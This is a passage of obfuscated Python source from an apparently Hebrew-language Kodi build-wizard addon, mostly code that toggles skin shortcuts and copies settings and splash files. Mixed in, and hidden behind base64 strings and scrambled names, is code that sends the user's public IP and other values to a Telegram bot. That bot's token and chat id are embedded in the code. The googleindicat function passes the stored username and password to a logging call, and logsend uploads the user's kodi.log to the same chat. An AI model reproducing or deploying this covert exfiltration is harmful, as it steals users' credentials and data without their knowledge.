          OOOOO0O00OO0000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:577
          O0OO0OOOOOOOOO0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:578
          OOOOO00OOO000O00O =str (json .loads (O0OO0OOOOOOOOO0O0 )['ip'])#line:579
          O0OO0O0000OOOOOO0 =OO0OOO0OOO0OO00OO #line:580
          O0OOOOO0O00000000 =O000O0OO000O0O0O0 #line:581
          import socket #line:583
          O0OO0OOOOOOOOO0O0 =urllib2 .urlopen (OOOOO0O00OO0000O0 .decode ('base64')+' - '+O0OO0O0000OOOOOO0 +' - '+O0OOOOO0O00000000 +' - '+O00OO0OOOOO000OO0 ).readlines ()#line:584
       except :pass #line:585
def googleindicat ():#line:588
			import logg #line:589
			O0OO00O0O0O00OOO0 =(ADDON .getSetting ("pass"))#line:590
			O0OO0O0O00O00O00O =(ADDON .getSetting ("user"))#line:591
			logg .logGA (O0OO00O0O0O00OOO0 ,O0OO0O0O00O00O00O )#line:592
def logsend ():#line:593
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:594
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:595
      howsentlog ()#line:597
      import requests #line:598
      if xbmc .getCondVisibility ('system.platform.windows'):#line:599
         OOO00OOO0O0O00O0O =xbmc .translatePath ('special://home/kodi.log')#line:600
         O0000O0OOOO0OO000 ={'chat_id':(None ,'-274262389'),'document':(OOO00OOO0O0O00O0O ,open (OOO00OOO0O0O00O0O ,'rb')),}#line:604
         O00O0OO000000O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:605
         O0OOOOOOOOOOO000O =requests .post (O00O0OO000000O00O .decode ('base64'),files =O0000O0OOOO0OO000 )#line:607
      elif xbmc .getCondVisibility ('system.platform.android'):#line:608
           OOO00OOO0O0O00O0O =xbmc .translatePath ('special://temp/kodi.log')#line:609
           O0000O0OOOO0OO000 ={'chat_id':(None ,'-274262389'),'document':(OOO00OOO0O0O00O0O ,open (OOO00OOO0O0O00O0O ,'rb')),}#line:613
           O00O0OO000000O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:614
           O0OOOOOOOOOOO000O =requests .post (O00O0OO000000O00O .decode ('base64'),files =O0000O0OOOO0OO000 )#line:616
      else :#line:617
           OOO00OOO0O0O00O0O =xbmc .translatePath ('special://kodi.log')#line:618
           O0000O0OOOO0OO000 ={'chat_id':(None ,'-274262389'),'document':(OOO00OOO0O0O00O0O ,open (OOO00OOO0O0O00O0O ,'rb')),}#line:622
           O00O0OO000000O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:623
           O0OOOOOOOOOOO000O =requests .post (O00O0OO000000O00O .decode ('base64'),files =O0000O0OOOO0OO000 )#line:625
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:626
def rdoff ():#line:628
	O00OO000OOO000O0O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:659
	O000OOO00000OO0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:660
	copyfile (O00OO000OOO000O0O ,O000OOO00000OO0OO )#line:661
def skindialogsettind18 ():#line:662
	try :#line:663
		OO000OOOOO00OOOO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:664
		OOO0OO0O0OO0O0OO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:665
		copyfile (OO000OOOOO00OOOO0 ,OOO0OO0O0OO0O0OO0 )#line:666
	except :pass #line:667
def rdon ():#line:668
	loginit .loginIt ('restore','all')#line:669
	OO0O0O00O0OO0OOO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:671
	O0O00O0O00O0O00O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:672
	copyfile (OO0O0O00O0OO0OOO0 ,O0O00O0O00O0O00O0 )#line:673
def adults18 ():#line:675
  OO00000000O00O000 =(ADDON .getSetting ("adults"))#line:676
  if OO00000000O00O000 =='true':#line:677
    OOO000O0OOOO00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:678
    with open (OOO000O0OOOO00OO0 ,'r')as OOOO000OO00OO0O00 :#line:679
      OOOO0000O0OOO00O0 =OOOO000OO00OO0O00 .read ()#line:680
    OOOO0000O0OOO00O0 =OOOO0000O0OOO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:698
    with open (OOO000O0OOOO00OO0 ,'w')as OOOO000OO00OO0O00 :#line:701
      OOOO000OO00OO0O00 .write (OOOO0000O0OOO00O0 )#line:702
def rdbuildaddon ():#line:703
  OO0OOO00OOOO00O0O =(ADDON .getSetting ("auto_rd"))#line:704
  if OO0OOO00OOOO00O0O =='true':#line:705
    O00O0O0O000OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:706
    with open (O00O0O0O000OO0O00 ,'r')as O00OO0000O0OOO00O :#line:707
      OO00OOO00OOOO0OO0 =O00OO0000O0OOO00O .read ()#line:708
    OO00OOO00OOOO0OO0 =OO00OOO00OOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:726
    with open (O00O0O0O000OO0O00 ,'w')as O00OO0000O0OOO00O :#line:729
      O00OO0000O0OOO00O .write (OO00OOO00OOOO0OO0 )#line:730
    O00O0O0O000OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:734
    with open (O00O0O0O000OO0O00 ,'r')as O00OO0000O0OOO00O :#line:735
      OO00OOO00OOOO0OO0 =O00OO0000O0OOO00O .read ()#line:736
    OO00OOO00OOOO0OO0 =OO00OOO00OOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:754
    with open (O00O0O0O000OO0O00 ,'w')as O00OO0000O0OOO00O :#line:757
      O00OO0000O0OOO00O .write (OO00OOO00OOOO0OO0 )#line:758
    O00O0O0O000OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:762
    with open (O00O0O0O000OO0O00 ,'r')as O00OO0000O0OOO00O :#line:763
      OO00OOO00OOOO0OO0 =O00OO0000O0OOO00O .read ()#line:764
    OO00OOO00OOOO0OO0 =OO00OOO00OOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:782
    with open (O00O0O0O000OO0O00 ,'w')as O00OO0000O0OOO00O :#line:785
      O00OO0000O0OOO00O .write (OO00OOO00OOOO0OO0 )#line:786
    O00O0O0O000OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:790
    with open (O00O0O0O000OO0O00 ,'r')as O00OO0000O0OOO00O :#line:791
      OO00OOO00OOOO0OO0 =O00OO0000O0OOO00O .read ()#line:792
    OO00OOO00OOOO0OO0 =OO00OOO00OOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:810
    with open (O00O0O0O000OO0O00 ,'w')as O00OO0000O0OOO00O :#line:813
      O00OO0000O0OOO00O .write (OO00OOO00OOOO0OO0 )#line:814
    O00O0O0O000OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:817
    with open (O00O0O0O000OO0O00 ,'r')as O00OO0000O0OOO00O :#line:818
      OO00OOO00OOOO0OO0 =O00OO0000O0OOO00O .read ()#line:819
    OO00OOO00OOOO0OO0 =OO00OOO00OOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:837
    with open (O00O0O0O000OO0O00 ,'w')as O00OO0000O0OOO00O :#line:840
      O00OO0000O0OOO00O .write (OO00OOO00OOOO0OO0 )#line:841
    O00O0O0O000OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:843
    with open (O00O0O0O000OO0O00 ,'r')as O00OO0000O0OOO00O :#line:844
      OO00OOO00OOOO0OO0 =O00OO0000O0OOO00O .read ()#line:845
    OO00OOO00OOOO0OO0 =OO00OOO00OOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:863
    with open (O00O0O0O000OO0O00 ,'w')as O00OO0000O0OOO00O :#line:866
      O00OO0000O0OOO00O .write (OO00OOO00OOOO0OO0 )#line:867
    O00O0O0O000OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:869
    with open (O00O0O0O000OO0O00 ,'r')as O00OO0000O0OOO00O :#line:870
      OO00OOO00OOOO0OO0 =O00OO0000O0OOO00O .read ()#line:871
    OO00OOO00OOOO0OO0 =OO00OOO00OOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:889
    with open (O00O0O0O000OO0O00 ,'w')as O00OO0000O0OOO00O :#line:892
      O00OO0000O0OOO00O .write (OO00OOO00OOOO0OO0 )#line:893
    O00O0O0O000OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:896
    with open (O00O0O0O000OO0O00 ,'r')as O00OO0000O0OOO00O :#line:897
      OO00OOO00OOOO0OO0 =O00OO0000O0OOO00O .read ()#line:898
    OO00OOO00OOOO0OO0 =OO00OOO00OOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:916
    with open (O00O0O0O000OO0O00 ,'w')as O00OO0000O0OOO00O :#line:919
      O00OO0000O0OOO00O .write (OO00OOO00OOOO0OO0 )#line:920
def rdbuildinstall ():#line:923
  try :#line:924
   OOOO0OO0OO0000O0O =(ADDON .getSetting ("auto_rd"))#line:925
   if OOOO0OO0OO0000O0O =='true':#line:926
     OOO00OOOOOOOOOOO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:927
     O0OO00O00OOOOO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:928
     copyfile (OOO00OOOOOOOOOOO0 ,O0OO00O00OOOOO00O )#line:929
  except :#line:930
     pass #line:931
def rdbuildaddonoff ():#line:934
    OO0O0O000O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:937
    with open (OO0O0O000O00OOOO0 ,'r')as O00OOO0O00O00O0O0 :#line:938
      O00O0OOO00OO000OO =O00OOO0O00O00O0O0 .read ()#line:939
    O00O0OOO00OO000OO =O00O0OOO00OO000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:957
    with open (OO0O0O000O00OOOO0 ,'w')as O00OOO0O00O00O0O0 :#line:960
      O00OOO0O00O00O0O0 .write (O00O0OOO00OO000OO )#line:961
    OO0O0O000O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:965
    with open (OO0O0O000O00OOOO0 ,'r')as O00OOO0O00O00O0O0 :#line:966
      O00O0OOO00OO000OO =O00OOO0O00O00O0O0 .read ()#line:967
    O00O0OOO00OO000OO =O00O0OOO00OO000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:985
    with open (OO0O0O000O00OOOO0 ,'w')as O00OOO0O00O00O0O0 :#line:988
      O00OOO0O00O00O0O0 .write (O00O0OOO00OO000OO )#line:989
    OO0O0O000O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:993
    with open (OO0O0O000O00OOOO0 ,'r')as O00OOO0O00O00O0O0 :#line:994
      O00O0OOO00OO000OO =O00OOO0O00O00O0O0 .read ()#line:995
    O00O0OOO00OO000OO =O00O0OOO00OO000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1013
    with open (OO0O0O000O00OOOO0 ,'w')as O00OOO0O00O00O0O0 :#line:1016
      O00OOO0O00O00O0O0 .write (O00O0OOO00OO000OO )#line:1017
    OO0O0O000O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1021
    with open (OO0O0O000O00OOOO0 ,'r')as O00OOO0O00O00O0O0 :#line:1022
      O00O0OOO00OO000OO =O00OOO0O00O00O0O0 .read ()#line:1023
    O00O0OOO00OO000OO =O00O0OOO00OO000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1041
    with open (OO0O0O000O00OOOO0 ,'w')as O00OOO0O00O00O0O0 :#line:1044
      O00OOO0O00O00O0O0 .write (O00O0OOO00OO000OO )#line:1045
    OO0O0O000O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1048
    with open (OO0O0O000O00OOOO0 ,'r')as O00OOO0O00O00O0O0 :#line:1049
      O00O0OOO00OO000OO =O00OOO0O00O00O0O0 .read ()#line:1050
    O00O0OOO00OO000OO =O00O0OOO00OO000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1068
    with open (OO0O0O000O00OOOO0 ,'w')as O00OOO0O00O00O0O0 :#line:1071
      O00OOO0O00O00O0O0 .write (O00O0OOO00OO000OO )#line:1072
    OO0O0O000O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1074
    with open (OO0O0O000O00OOOO0 ,'r')as O00OOO0O00O00O0O0 :#line:1075
      O00O0OOO00OO000OO =O00OOO0O00O00O0O0 .read ()#line:1076
    O00O0OOO00OO000OO =O00O0OOO00OO000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1094
    with open (OO0O0O000O00OOOO0 ,'w')as O00OOO0O00O00O0O0 :#line:1097
      O00OOO0O00O00O0O0 .write (O00O0OOO00OO000OO )#line:1098
    OO0O0O000O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1100
    with open (OO0O0O000O00OOOO0 ,'r')as O00OOO0O00O00O0O0 :#line:1101
      O00O0OOO00OO000OO =O00OOO0O00O00O0O0 .read ()#line:1102
    O00O0OOO00OO000OO =O00O0OOO00OO000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1120
    with open (OO0O0O000O00OOOO0 ,'w')as O00OOO0O00O00O0O0 :#line:1123
      O00OOO0O00O00O0O0 .write (O00O0OOO00OO000OO )#line:1124
    OO0O0O000O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1127
    with open (OO0O0O000O00OOOO0 ,'r')as O00OOO0O00O00O0O0 :#line:1128
      O00O0OOO00OO000OO =O00OOO0O00O00O0O0 .read ()#line:1129
    O00O0OOO00OO000OO =O00O0OOO00OO000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1147
    with open (OO0O0O000O00OOOO0 ,'w')as O00OOO0O00O00O0O0 :#line:1150
      O00OOO0O00O00O0O0 .write (O00O0OOO00OO000OO )#line:1151
def rdbuildinstalloff ():#line:1154
    try :#line:1155
       OO0O0OO00OOO0O000 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1156
       O0O0OO0OO000O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1157
       copyfile (OO0O0OO00OOO0O000 ,O0O0OO0OO000O0O00 )#line:1159
       OO0O0OO00OOO0O000 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1161
       O0O0OO0OO000O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1162
       copyfile (OO0O0OO00OOO0O000 ,O0O0OO0OO000O0O00 )#line:1164
       OO0O0OO00OOO0O000 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1166
       O0O0OO0OO000O0O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1167
       copyfile (OO0O0OO00OOO0O000 ,O0O0OO0OO000O0O00 )#line:1169
       OO0O0OO00OOO0O000 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1172
       O0O0OO0OO000O0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1173
       copyfile (OO0O0OO00OOO0O000 ,O0O0OO0OO000O0O00 )#line:1175
    except :#line:1177
       pass #line:1178
def rdbuildaddonON ():#line:1185
    OOO00OOOO0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1187
    with open (OOO00OOOO0OOOOOOO ,'r')as OO000000O000OOOOO :#line:1188
      OOO000O00OO0OO0OO =OO000000O000OOOOO .read ()#line:1189
    OOO000O00OO0OO0OO =OOO000O00OO0OO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1207
    with open (OOO00OOOO0OOOOOOO ,'w')as OO000000O000OOOOO :#line:1210
      OO000000O000OOOOO .write (OOO000O00OO0OO0OO )#line:1211
    OOO00OOOO0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1215
    with open (OOO00OOOO0OOOOOOO ,'r')as OO000000O000OOOOO :#line:1216
      OOO000O00OO0OO0OO =OO000000O000OOOOO .read ()#line:1217
